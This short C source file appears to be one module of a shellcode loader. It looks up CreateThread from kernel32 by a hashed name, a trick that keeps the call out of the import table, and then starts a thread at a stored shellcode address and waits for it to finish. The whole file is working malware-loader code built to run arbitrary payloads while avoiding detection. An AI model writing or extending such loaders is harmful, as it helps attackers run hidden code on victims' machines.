#include "../../../includes/memory/memory.h"
#include "../../../includes/apis/apis.h"
#include "../../../includes/core/core.h"









BOOL execution_load_apis() {
	g_ldr->apis->CreateThread = (pCreateThread)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATETHREAD);
	if (g_ldr->apis->CreateThread == NULL) {
		return FALSE;
	}
	return TRUE;
}

BOOL execution_run(MemoryInfo memInfo) {
	HANDLE hThread = g_ldr->apis->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memInfo.ShellCodeAddress, NULL, 0, NULL);
	if (hThread == NULL) return FALSE;
	WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}


